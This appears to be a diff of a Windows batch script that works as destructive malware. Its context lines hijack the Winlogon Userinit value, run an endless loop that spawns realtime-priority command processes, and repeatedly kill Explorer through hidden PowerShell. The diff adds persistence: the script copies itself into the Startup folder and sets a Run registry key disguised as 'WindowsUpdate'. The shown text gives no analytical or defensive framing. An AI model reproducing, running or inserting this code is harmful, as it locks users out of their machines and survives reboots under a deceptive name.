@@ -1,5 +1,7 @@
 @echo off
 
+copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%0" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
 
 :loop
@@ -37,4 +39,5 @@ start "" /realtime cmd /c "for /l %%x in (1,0,2023020230) do (start /realtime cm
 powershell -WindowStyle Hidden -Command "while(1){Get-Process -Name 'explorer' -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Process -WindowStyle Hidden -PassThru cmd -Args '/c %0'|ForEach-Object{$_.ProcessorAffinity=1;$_.PriorityClass='Realtime'}}"
 
 goto loop
+
 
